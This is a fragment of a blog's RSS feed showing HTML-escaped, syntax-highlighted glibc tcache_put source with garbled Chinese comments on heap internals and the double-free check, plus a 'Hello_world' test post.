&lt;/span>&lt;span class="lnt" id="hl-1-6">&lt;a class="lnlinks" href="#hl-1-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-7">&lt;a class="lnlinks" href="#hl-1-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-8">&lt;a class="lnlinks" href="#hl-1-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-9">&lt;a class="lnlinks" href="#hl-1-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-10">&lt;a class="lnlinks" href="#hl-1-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-11">&lt;a class="lnlinks" href="#hl-1-11">11&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-12">&lt;a class="lnlinks" href="#hl-1-12">12&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-13">&lt;a class="lnlinks" href="#hl-1-13">13&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-1-14">&lt;a class="lnlinks" href="#hl-1-14">14&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">static&lt;/span> &lt;span class="n">__always_inline&lt;/span> &lt;span class="kt">void&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">tcache_put&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mchunkptr&lt;/span> &lt;span class="n">chunk&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">size_t&lt;/span> &lt;span class="n">tc_idx&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tcache_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">tcache_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nf">chunk2mem&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">chunk&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="cm">/* Mark this chunk as &amp;#34;in the tcache&amp;#34; so the test in _int_free will
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> detect a double free. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">e&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tcache&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//è®¾ç½®æ‰€å±çš„tcache
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">e&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">next&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">tcache&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tc_idx&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="c1">//å•é“¾è¡¨å¤´æ’æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">tcache&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">entries&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tc_idx&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">++&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tcache&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">counts&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">tc_idx&lt;/span>&lt;span class="p">]);&lt;/span> &lt;span class="c1">//è®¡æ•°å¢åŠ 
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>tcache double free æ£€æŸ¥&lt;/p></description></item><item><title>Hello_world</title><link>/posts/hello_world/</link><pubDate>Mon, 14 Apr 2025 20:18:58 +0800</pubDate><guid>/posts/hello_world/</guid><description>&lt;p>md test~ ğŸ¤”&lt;/p></description></item></channel></rss>